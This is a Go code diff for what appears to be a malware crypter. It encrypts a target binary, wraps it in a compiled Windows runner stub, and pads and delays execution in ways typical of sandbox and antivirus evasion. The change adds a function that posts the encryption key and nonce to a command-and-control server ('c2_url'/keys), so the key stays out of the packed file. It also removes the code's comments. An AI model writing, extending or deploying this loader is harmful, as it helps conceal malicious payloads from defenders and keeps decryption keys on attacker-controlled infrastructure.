@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -9,44 +10,35 @@ import (
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 )
 
-// runnerSource is the Go source of the self-extracting runner stub.
-// It lives in runner.src (not .go, so the compiler ignores it).
-// At encryption time it is compiled into a Windows .exe.
-//
 //go:embed runner.src
 var runnerSource []byte
 
 const magic = "HBX1"
 
-// metadata is the JSON trailer appended after the ciphertext.
 type metadata struct {
-	Key           string  `json:"key"`
-	Nonce         string  `json:"nonce"`
+	Key           string  `json:"key,omitempty"`
+	Nonce         string  `json:"nonce,omitempty"`
+	KeyID         string  `json:"key_id,omitempty"`
+	C2URL         string  `json:"c2_url,omitempty"`
 	Delay         float64 `json:"delay"`
 	OriginalName  string  `json:"original_name"`
 	OriginalSize  int     `json:"original_size"`
 	CiphertextLen int     `json:"ciphertext_len"`
 }
 
-// encryptAndBuild reads inputPath, encrypts it, compiles the runner
-// stub, and assembles the final output file at outputPath.
-//
-// Output layout:
-//
-//	[runner.exe] [zero padding] [ciphertext] [JSON meta] [metaLen 4B] ["HBX1"]
-func encryptAndBuild(inputPath, outputPath string, addSizeMB, delay float64) error {
-	// 1. Read the target binary.
+func encryptAndBuild(inputPath, outputPath string, addSizeMB, delay float64, c2url string) error {
 	plaintext, err := os.ReadFile(inputPath)
 	if err != nil {
 		return fmt.Errorf("cannot read %s: %w", inputPath, err)
 	}
 
-	// 2. Encrypt with AES-256-GCM.
 	key := make([]byte, 32)
 	nonce := make([]byte, 12)
 	rand.Read(key)
@@ -62,25 +54,38 @@ func encryptAndBuild(inputPath, outputPath string, addSizeMB, delay float64) err
 	}
 	ciphertext := gcm.Seal(nil, nonce, plaintext, []byte(magic))
 
-	// 3. Build the JSON trailer.
 	meta := metadata{
-		Key:           base64.StdEncoding.EncodeToString(key),
-		Nonce:         base64.StdEncoding.EncodeToString(nonce),
 		Delay:         delay,
 		OriginalName:  filepath.Base(inputPath),
 		OriginalSize:  len(plaintext),
 		CiphertextLen: len(ciphertext),
 	}
+
+	c2url = strings.TrimRight(c2url, "/")
+
+	if c2url != "" {
+		keyID, err := sendKeyToServer(c2url, key, nonce)
+		if err != nil {
+			return fmt.Errorf("key server: %w", err)
+		}
+		meta.KeyID = keyID
+		meta.C2URL = c2url
+		fmt.Printf("[INFO] Key sent to server: key_id=%s\n", keyID)
+		fmt.Printf("[INFO] Key is NOT stored in the output file.\n")
+	} else {
+		meta.Key = base64.StdEncoding.EncodeToString(key)
+		meta.Nonce = base64.StdEncoding.EncodeToString(nonce)
+		fmt.Println("[INFO] Key stored in file (no --c2-url specified).")
+	}
+
 	metaJSON, _ := json.Marshal(meta)
 
-	// 4. Cross-compile the runner stub for Windows.
 	fmt.Println("[INFO] Compiling runner stub for windows/amd64 ...")
 	stub, err := compileRunner()
 	if err != nil {
 		return fmt.Errorf("compile runner: %w", err)
 	}
 
-	// 5. Assemble the output file.
 	paddingSize := int(addSizeMB * 1024 * 1024)
 
 	metaLenBuf := make([]byte, 4)
@@ -110,8 +115,38 @@ func encryptAndBuild(inputPath, outputPath string, addSizeMB, delay float64) err
 	return nil
 }
 
-// compileRunner cross-compiles the embedded runner source into a
-// Windows .exe in a temp directory and returns the resulting bytes.
+type storeKeyRequest struct {
+	Key   string `json:"key"`
+	Nonce string `json:"nonce"`
+}
+
+type storeKeyResponse struct {
+	KeyID string `json:"key_id"`
+}
+
+func sendKeyToServer(c2url string, key, nonce []byte) (string, error) {
+	body, _ := json.Marshal(storeKeyRequest{
+		Key:   base64.StdEncoding.EncodeToString(key),
+		Nonce: base64.StdEncoding.EncodeToString(nonce),
+	})
+
+	resp, err := http.Post(c2url+"/keys", "application/json", bytes.NewReader(body))
+	if err != nil {
+		return "", fmt.Errorf("cannot reach key server at %s: %w", c2url, err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return "", fmt.Errorf("key server returned %d", resp.StatusCode)
+	}
+
+	var result storeKeyResponse
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		return "", fmt.Errorf("bad response from key server: %w", err)
+	}
+	return result.KeyID, nil
+}
+
 func compileRunner() ([]byte, error) {
 	tmpDir, err := os.MkdirTemp("", "hbx-build-")
 	if err != nil {
@@ -137,7 +172,6 @@ func compileRunner() ([]byte, error) {
 	return os.ReadFile(outPath)
 }
 
-// writePadding writes n zero bytes in 32 KB chunks.
 func writePadding(f *os.File, n int) {
 	buf := make([]byte, 32*1024)
 	for n > 0 {
